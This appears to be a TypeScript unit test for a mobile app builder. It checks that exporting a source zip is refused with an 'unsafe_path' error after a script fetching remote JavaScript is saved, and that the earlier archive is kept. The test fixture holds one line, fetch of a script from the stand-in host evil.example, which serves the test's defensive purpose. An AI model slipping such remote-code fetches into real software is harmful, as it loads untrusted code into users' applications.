import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import type { BuildJobContext, BuildManifest } from '../../../packages/shared/src/buildMenu.js';
import { materialize } from '../materialize.js';
import { createMobilePorts } from '../mobile/ports.js';
import { ProcessLeaseRegistry } from '../processLease.js';
import { codeTag, readCode } from '../../mobile/versions.js';
import { readMobile } from '../../mobile/store.js';
import { saveSource } from '../../mobile/source.js';

function context(workspace: string): BuildJobContext {
  const selection: BuildManifest['selection'] = { kind: 'mobile' };
  return {
    workspace,
    jobId: 'job_mobile_remote',
    operation: { action: 'package', format: 'source-zip' },
    signal: new AbortController().signal,
    manifest: {
      schemaVersion: 1,
      projectId: 'app_abcdefghijkl',
      revision: 1,
      selection,
      title: 'جوال',
      sourceDir: 'app',
      template: { id: 'fixture', revision: '1', lockSha256: 'a'.repeat(64) },
      consent: { autostart: false, publish: false },
    },
  };
}

test('a mobile source zip refuses a remote script and keeps the previous archive', async () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'loam-mobile-remote-'));
  const ports = createMobilePorts({ leases: new ProcessLeaseRegistry(200) });
  try {
    materialize({ selection: { kind: 'mobile' }, workspace: root, title: 'جوال' });
    const first = await ports.export(context(root), 'source-zip');
    const zipPath = path.join(root, first.relativePath);
    const bytes = fs.readFileSync(zipPath);
    const project = readMobile(root);
    assert.ok(project);
    const script = 'fetch("https://evil.example/a.js");\n';
    saveSource(root, 'web/app.js', script, project.revision, codeTag(readCode(root)));
    await assert.rejects(
      ports.export(context(root), 'source-zip'),
      (error: unknown) => error instanceof Error && error.message === 'unsafe_path',
    );
    assert.equal(fs.readFileSync(zipPath).equals(bytes), true);
    assert.match(JSON.stringify(readCode(root).files), /evil\.example/);
  } finally {
    fs.rmSync(root, { recursive: true, force: true });
  }
});
